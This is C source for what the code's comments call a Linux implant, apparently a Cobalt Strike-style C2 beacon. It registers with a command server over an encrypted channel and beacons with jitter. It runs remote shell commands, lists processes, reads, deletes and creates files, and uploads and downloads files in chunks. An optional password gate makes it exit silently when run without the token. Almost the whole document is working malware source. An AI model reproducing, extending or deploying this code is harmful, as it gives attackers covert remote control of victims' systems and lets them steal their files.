/* 读 /proc/<pid>/stat 的 ppid (跳过可能含空格与括号的 comm) */
static unsigned int stat_ppid(const char *pid)
{
    char path[300], buf[1024];
    unsigned int n;
    char *p;

    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
    n = sizeof(buf) - 1u;
    {
        int fd = open(path, O_RDONLY | O_CLOEXEC);
        ssize_t r;
        if (fd < 0) return 0;
        r = read(fd, buf, n);
        close(fd);
        if (r <= 0) return 0;
        buf[r] = 0;
    }

    p = strrchr(buf, ')');          /* comm 之后才是稳定字段 */
    if (!p) return 0;
    p++;
    while (*p == ' ') p++;          /* state */
    while (*p && *p != ' ') p++;
    while (*p == ' ') p++;
    return (unsigned int)strtoul(p, NULL, 10);
}

static unsigned int proc_threads(const char *pid)
{
    char path[300];
    FILE *f;

    snprintf(path, sizeof(path), "/proc/%s/status", pid);
    f = fopen(path, "r");
    if (!f) return 0;
    {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Threads:", 8) == 0) {
                unsigned int v = (unsigned int)strtoul(line + 8, NULL, 10);
                fclose(f);
                return v;
            }
        }
    }
    fclose(f);
    return 0;
}

/* 结构化进程列表: pid \t ppid \t threads \t name (与 Windows 同字段) */
static unsigned int cmd_ps_list(unsigned char *out, unsigned int cap)
{
#ifdef __APPLE__
    return proc_ps_macos(out, cap, 1);
#else
    DIR *d = opendir("/proc");
    struct dirent *e;
    unsigned int total = 0;

    if (!d) return 0;

    while ((e = readdir(d))) {
        char path[300], comm[128], line[400];
        unsigned int ppid, thr, L;
        int n;

        if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;

        snprintf(path, sizeof(path), "/proc/%s/comm", e->d_name);
        if (!slurp_head(path, comm, sizeof(comm))) continue;

        ppid = stat_ppid(e->d_name);
        thr  = proc_threads(e->d_name);

        L = s_len(comm);
        if (L > 200u) L = 200u;

        n = snprintf(line, sizeof(line), "%s\t%u\t%u\t",
                     e->d_name, ppid, thr);
        if (n < 0 || (unsigned int)n + L + 2u >= sizeof(line)) continue;
        memcpy(line + n, comm, L);
        n += (int)L;
        line[n++] = '\r';
        line[n++] = '\n';

        if (total + (unsigned int)n > cap) break;
        memcpy(out + total, line, (unsigned int)n);
        total += (unsigned int)n;
    }
    closedir(d);
    return total;
#endif
}

/* 文件系统操作, op 语义见 protocol_v2.md 4.1 / server.go v2Route */
static unsigned int cmd_fs_ops(char op, const char *arg,
                               unsigned char *out, unsigned int cap)
{
    unsigned int total = 0;

    switch (op) {
    case 0x01:   /* pwd */
        {
            int n = snprintf((char *)out, cap, "%s\r\n", g_cwd);
            total = (n > 0) ? (unsigned int)n : 0;
        }
        break;

    case 0x02:   /* cd */
        if (!arg[0]) {
            char c[PATH_MAX];
            if (getcwd(c, sizeof(c))) s_copy(g_cwd, c, sizeof(g_cwd));
        } else if (chdir(arg) == 0) {
            char c[PATH_MAX];
            if (getcwd(c, sizeof(c))) s_copy(g_cwd, c, sizeof(g_cwd));
            else                      s_copy(g_cwd, arg, sizeof(g_cwd));
        } else {
            const char *e = "[-] 目录不存在\r\n";
            s_copy((char *)out, e, cap);
            total = s_len(e);
        }
        break;

    case 0x03:   /* ls */
        {
            const char *dir = arg[0] ? arg : g_cwd;
            DIR *d = opendir(dir);

            if (!d) {
                const char *e = "[-] 无法枚举目录\r\n";
                s_copy((char *)out, e, cap);
                total = s_len(e);
                break;
            }
            {
                struct dirent *ent;
                while ((ent = readdir(d))) {
                    char full[PATH_MAX], line[640];
                    struct stat st;
                    int n;

                    if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
                        continue;

                    {
                        int m = snprintf(full, sizeof(full), "%s/%s", dir, ent->d_name);
                        if (m <= 0 || (unsigned int)m >= sizeof(full)) continue;
                    }
                    if (lstat(full, &st) != 0) continue;

                    n = snprintf(line, sizeof(line), "%c\t%llu\t%s\r\n",
                                 S_ISDIR(st.st_mode) ? 'd' : '-',
                                 (unsigned long long)st.st_size,
                                 ent->d_name);
                    if (n <= 0 || (unsigned int)n >= sizeof(line)) continue;
                    if (total + (unsigned int)n > cap) break;
                    memcpy(out + total, line, (unsigned int)n);
                    total += (unsigned int)n;
                }
            }
            closedir(d);
        }
        break;

    case 0x04:   /* rm */
        if (unlink(arg) == 0) {
            const char *m = "[+] 已删除\r\n";
            s_copy((char *)out, m, cap);
            total = s_len(m);
        } else {
            const char *m = "[-] 删除失败\r\n";
            s_copy((char *)out, m, cap);
            total = s_len(m);
        }
        break;

    case 0x05:   /* mkdir */
        if (mkdir(arg, 0755) == 0) {
            const char *m = "[+] 已创建\r\n";
            s_copy((char *)out, m, cap);
            total = s_len(m);
        } else {
            const char *m = "[-] 创建失败\r\n";
            s_copy((char *)out, m, cap);
            total = s_len(m);
        }
        break;

    case 0x06:   /* cat */
        {
            int fd = open(arg, O_RDONLY | O_CLOEXEC);
            if (fd < 0) {
                const char *e = "[-] 无法打开文件\r\n";
                s_copy((char *)out, e, cap);
                total = s_len(e);
            } else {
                while (total < cap) {
                    ssize_t n = read(fd, out + total, cap - total);
                    if (n > 0) { total += (unsigned int)n; continue; }
                    if (n < 0 && errno == EINTR) continue;
                    break;
                }
                close(fd);
            }
        }
        break;

    default:
        {
            const char *e = "[-] 未知文件操作\r\n";
            s_copy((char *)out, e, cap);
            total = s_len(e);
        }
        break;
    }
    return total;
}

/* 启动下载: 记录状态, 首块在下一次循环发出 */
static void start_download(const cs_task *t)
{
    int fd;
    struct stat st;

    if (!box_space(64)) {
        box_result_str(t->id, ST_ERR, "[-] outbox 已满\r\n");
        return;
    }

    {
        unsigned int L = t->arglen < sizeof(g_dl_path) - 1u
                       ? t->arglen : (unsigned int)(sizeof(g_dl_path) - 1u);
        memcpy(g_dl_path, t->arg, L);
        g_dl_path[L] = 0;
    }

    fd = open(g_dl_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        box_result_str(t->id, ST_ERR, "[-] 无法打开文件\r\n");
        return;
    }
    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
        close(fd);
        box_result_str(t->id, ST_ERR, "[-] 不是普通文件\r\n");
        return;
    }
    close(fd);

    g_dl_active = 1;
    g_dl_job    = t->id;
    g_dl_off    = 0;
    g_dl_total  = (unsigned int)st.st_size;

    {
        char note[PATH_MAX + 32];
        int n = snprintf(note, sizeof(note), "[+] 开始下载 %s\r\n", g_dl_path);
        if (n > 0) box_result(t->id, ST_PARTIAL, (const unsigned char *)note,
                              (unsigned int)n);
    }
}

/* 推进下载: 每轮发送一块 FILE_CHUNK [job_id][offset][total][bytes] */
static void pump_download(void)
{
    int fd;
    unsigned int room, want, got = 0;
    unsigned int start;
    unsigned char *buf;

    if (!g_dl_active) return;

    /* 每块 TLV 开销 = 6 + 12 */
    if (!box_space(C2_CHUNK + 32u)) return;

    room = MAX_PLAIN - g_outlen - 32u;
    want = C2_CHUNK;
    if (want > room) want = room;
    if (want == 0) return;

    start = box_begin(T_FILE_CHUNK, 12u + want);
    if (start == BOX_FAIL) return;
    buf = g_out + g_outlen;

    cs_put_be32(buf, g_dl_job);
    cs_put_be32(buf + 4, g_dl_off);
    cs_put_be32(buf + 8, g_dl_total);

    if (g_dl_mem) {
        unsigned int left = g_dl_total - g_dl_off;
        got = (left < want) ? left : want;
        if (got) memcpy(buf + 12, g_dl_mem + g_dl_off, got);
    } else {
        fd = open(g_dl_path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) {
            box_end(start, 0);
            g_outlen = start;         /* 丢弃本块头 */
            g_dl_active = 0;
            box_result_str(g_dl_job, ST_ERR, "[-] 读取失败\r\n");
            return;
        }
        if (lseek(fd, (off_t)g_dl_off, SEEK_SET) >= 0) {
            while (got < want) {
                ssize_t n = read(fd, buf + 12 + got, want - got);
                if (n > 0) { got += (unsigned int)n; continue; }
                if (n < 0 && errno == EINTR) continue;
                break;
            }
        }
        close(fd);
    }

    box_end(start, 12u + got);
    g_dl_off += got;

    if (got == 0 || g_dl_off >= g_dl_total) {
        unsigned int job = g_dl_job;
        g_dl_active = 0;
        if (g_dl_mem) { free(g_dl_mem); g_dl_mem = NULL; }
        box_result_str(job, ST_OK, "[+] 传输完成\r\n");
    }
}

/* 上传块: arg = [2B path_len][path][4B total][4B offset][bytes] */
static void do_upload(const cs_task *t)
{
    unsigned short plen;
    const unsigned char *p = t->arg;
    char path[PATH_MAX];
    unsigned int total, offset, datalen;
    int fd, first;

    if (t->arglen < 10u) { box_result_str(t->id, ST_ERR, "[-] 上传参数错误\r\n"); return; }

    plen = cs_be16(p);
    if (plen == 0 || plen > sizeof(path) - 1u || 2u + plen + 8u > t->arglen) {
        box_result_str(t->id, ST_ERR, "[-] 上传参数错误\r\n");
        return;
    }
    memcpy(path, p + 2, plen);
    path[plen] = 0;

    total   = cs_be32(p + 2 + plen);
    offset  = cs_be32(p + 2 + plen + 4);
    datalen = t->arglen - (2u + plen + 8u);
    first   = (offset == 0);

    fd = open(path, O_WRONLY | O_CREAT | (first ? O_TRUNC : 0), 0644);
    if (fd < 0) {
        box_result_str(t->id, ST_ERR, "[-] 无法写入文件\r\n");
        return;
    }
    if (datalen) {
        unsigned int done = 0;
        while (done < datalen) {
            ssize_t n = write(fd, p + 2 + plen + 8 + done, datalen - done);
            if (n > 0) { done += (unsigned int)n; continue; }
            if (n < 0 && errno == EINTR) continue;
            break;
        }
    }
    close(fd);

    if (offset + datalen >= total) {
        char note[PATH_MAX + 32];
        int n = snprintf(note, sizeof(note), "[+] 上传完成 %s\r\n", path);
        if (n > 0) box_result(t->id, ST_OK, (const unsigned char *)note, (unsigned int)n);
    } else {
        box_result_str(t->id, ST_PARTIAL, "");
    }
}

/* ------------------------------------------------------------ 任务分发 */

static void run_task(const cs_task *t);

/* 暂存一个传输类任务 (参数必须复制: t->arg 指向会被下一批覆盖的下行缓冲) */
static void pend_push(const cs_task *t)
{
    pend_task *p;

    if (g_pend_n >= PEND_MAX) {
        box_result_str(t->id, ST_BUSY, "[-] 传输忙, 任务队列已满\r\n");
        return;
    }
    p = &g_pend[g_pend_n++];
    p->id  = t->id;
    p->cls = t->cls;
    s_copy(p->alias, t->alias, sizeof(p->alias));
    p->arglen = t->arglen < PEND_ARG_MAX ? t->arglen : PEND_ARG_MAX;
    if (p->arglen) memcpy(p->arg, t->arg, p->arglen);

    /* 明确告知进入排队, 否则操作员只会看到"命令无响应" */
    box_result_str(t->id, ST_BUSY, "[*] 当前有传输进行中, 任务已排队\r\n");
}

static void pend_run(void)
{
    int i = 0;

    while (i < g_pend_n && !g_dl_active) {
        cs_task t;
        int k;

        t.id     = g_pend[i].id;
        t.cls    = g_pend[i].cls;
        s_copy(t.alias, g_pend[i].alias, sizeof(t.alias));
        t.arg    = g_pend[i].arg;
        t.arglen = g_pend[i].arglen;

        /* 先移出队列再执行, 避免 run_task 内的忙检查把它又推回来 */
        for (k = i; k + 1 < g_pend_n; k++) g_pend[k] = g_pend[k + 1];
        g_pend_n--;

        run_task(&t);
    }
}

static void run_task(const cs_task *t)
{
    unsigned int n = 0;

    /* 传输忙: 延迟传输类任务, 避免打断正在进行的传输 (与 Windows 侧同构) */
    if (g_dl_active && t->cls == CMD_FILE_DL) { pend_push(t); return; }

    switch (t->cls) {
    case CMD_EXEC_SHELL:
        {
            char line[2048], real[2048];
            unsigned int L = t->arglen < sizeof(line) - 1u
                           ? t->arglen : (unsigned int)(sizeof(line) - 1u);

            if (L) memcpy(line, t->arg, L);
            line[L] = 0;

            compat_shell(line, real, sizeof(real));
            n = run_shell(real, g_scratch, CMD_CAP);
            box_result(t->id, ST_OK, g_scratch, n);
        }
        break;

    case CMD_PROC_LIST:
        n = cmd_proc_list(g_scratch, CMD_CAP);
        box_result(t->id, ST_OK, g_scratch, n);
        break;

    case CMD_PS_LIST:
        n = cmd_ps_list(g_scratch, CMD_CAP);
        box_result(t->id, ST_OK, g_scratch, n);
        break;

    case CMD_FS_OPS:
        {
            char op = (t->arglen > 0) ? (char)t->arg[0] : 0;
            char argb[PATH_MAX];
            unsigned int L = 0;

            if (t->arglen > 1u) {
                L = t->arglen - 1u;
                if (L > sizeof(argb) - 1u) L = sizeof(argb) - 1u;
                memcpy(argb, t->arg + 1, L);
            }
            argb[L] = 0;
            n = cmd_fs_ops(op, argb, g_scratch, CMD_CAP);
            box_result(t->id, ST_OK, g_scratch, n);
        }
        break;

    case CMD_FILE_DL:
        start_download(t);
        break;

    case CMD_FILE_UP:
        do_upload(t);
        break;

    case CMD_SET_SLEEP:
        if (t->arglen >= 5u) {
            unsigned int ms = cs_be32(t->arg);
            unsigned char j = t->arg[4];
            g_sess_state.sleep_ms = ms;
            g_sess_state.jitter   = j;
            box_result_str(t->id, ST_OK, "[+] sleep 已更新\r\n");
        } else {
            box_result_str(t->id, ST_ERR, "[-] sleep 参数错误\r\n");
        }
        break;

    case CMD_EXIT:
        box_result_str(t->id, ST_OK, "[+] 会话结束\r\n");
        break;

    default:
        box_result_str(t->id, ST_ERR, "[-] 该命令类别在 Linux 植入体上未实现\r\n");
        break;
    }
}

/* ------------------------------------------------------------ 主循环 */

static int beacon_run(const char *argv0)
{
    unsigned int flen, rlen;
    int plen;

    signal(SIGPIPE, SIG_IGN);      /* 对端关闭时不因写 socket 被打断 */
    signal(SIGHUP,  SIG_IGN);

    g_tx      = (unsigned char *)malloc(MAX_FRAME);
    g_rx      = (unsigned char *)malloc(MAX_FRAME);
    g_pt      = (unsigned char *)malloc(MAX_PLAIN);
    g_out     = (unsigned char *)malloc(MAX_PLAIN);
    g_scratch = (unsigned char *)malloc(512u * 1024u);

    if (!g_tx || !g_rx || !g_pt || !g_out || !g_scratch) return 1;

    memset(&g_sess_state, 0, sizeof(g_sess_state));
    g_sess_state.sleep_ms = C2_SLEEP;
    g_sess_state.jitter   = (unsigned char)C2_JITTER;

    if (!csdev_make_session_keys(g_sess_state.aes_key, g_sess_state.hmac_key)) return 2;

    /* 采集元信息 (字段顺序与 Windows 侧一致) */
    build_meta(g_meta, sizeof(g_meta), argv0);

    /* 当前目录初始化为进程 cwd */
    if (!getcwd(g_cwd, sizeof(g_cwd))) s_copy(g_cwd, "/", sizeof(g_cwd));

    /* ---- checkin ---- */
    flen = cs_frame_checkin(g_tx, MAX_FRAME, CSDEV_PUBKEY_BLOB, CSDEV_PUBKEY_LEN,
                            g_sess_state.aes_key, g_sess_state.hmac_key,
                            g_meta, s_len(g_meta));
    if (!flen) return 4;

    rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
    if (rlen < CS_FRAME_HDR) return 5;

    g_sess_state.session_id = cs_be32(g_rx + 4);
    if (g_sess_state.session_id == 0) return 6;

    plen = cs_frame_open(&g_sess_state, g_rx, rlen, g_pt, MAX_PLAIN);
    if (plen < 0) return 7;

    {
        unsigned int count = cs_batch_count(g_pt, (unsigned int)plen), i;
        for (i = 0; i < count; i++) {
            cs_task t;
            if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
            run_task(&t);
        }
    }

    /* ---- 主循环 ---- */
    for (;;) {
        unsigned int up = 0;

        beacon_sleep(g_sess_state.sleep_ms, g_sess_state.jitter);

        /* 推进未完成的传输与被延迟的传输任务 */
        pump_download();
        pend_run();

        /* 组装上行明文: outbox 内容 + 心跳 */
        if (g_outlen > 0) {
            memcpy(g_pt, g_out, g_outlen);
            up = g_outlen;
        }
        {
            unsigned char hb[8];
            struct timespec ts;
            unsigned long long ms;

            clock_gettime(CLOCK_REALTIME, &ts);
            ms = (unsigned long long)ts.tv_sec * 1000ull
               + (unsigned long long)(ts.tv_nsec / 1000000L);
            cs_put_be32(hb, (unsigned int)(ms >> 32));
            cs_put_be32(hb + 4, (unsigned int)(ms & 0xFFFFFFFFull));
            up += cs_tlv_write(g_pt + up, MAX_PLAIN - up, T_HEARTBEAT, hb, 8);
        }

        flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, up, g_tx, MAX_FRAME);
        if (!flen) { beacon_sleep(5000, 0); continue; }

        rlen = c2_post(g_tx, flen, g_rx, MAX_FRAME);
        if (rlen < CS_FRAME_HDR) {
            /* 网络失败: 保留 outbox 待下次重试 (上限保护) */
            if (g_outlen > MAX_PLAIN - 1024u) g_outlen = 0;
            continue;
        }

        /* 发送成功才清空 outbox */
        g_outlen = 0;

        plen = cs_frame_open(&g_sess_state, g_rx, rlen, g_pt, MAX_PLAIN);
        if (plen <= 0) continue;

        {
            unsigned int count = cs_batch_count(g_pt, (unsigned int)plen), i;
            int want_exit = 0;

            for (i = 0; i < count; i++) {
                cs_task t;
                if (!cs_batch_task(g_pt, (unsigned int)plen, i, &t)) break;
                if (t.cls == CMD_EXIT) want_exit = 1;
                run_task(&t);
            }

            if (want_exit) {
                /* 把结束回执发出去再退出 */
                unsigned int x = 0;
                if (g_outlen > 0) { memcpy(g_pt, g_out, g_outlen); x = g_outlen; }
                flen = cs_frame_seal(&g_sess_state, F_HASRESULT, g_pt, x, g_tx, MAX_FRAME);
                if (flen) c2_post(g_tx, flen, g_rx, MAX_FRAME);
                return 0;
            }
        }
    }
}

int main(int argc, char **argv)
{
#ifdef C2_TOKEN_HASH
    /* 启动口令门控: 参数(或环境变量 CSDEV_TOKEN)里没有正确口令就安静退出。
     * 生成时不给 -Password 则这段不编译, 行为与原来一致。 */
    {
        int i, ok = 0;
        const char *env = getenv("CSDEV_TOKEN");
        if (env && cs_token_match(env)) ok = 1;
        for (i = 1; !ok && i < argc; i++) {
            if (cs_token_match(argv[i])) ok = 1;
        }
        if (!ok) return 0;
    }
#endif
    return beacon_run(argc > 0 ? argv[0] : "beacon2_linux");
}
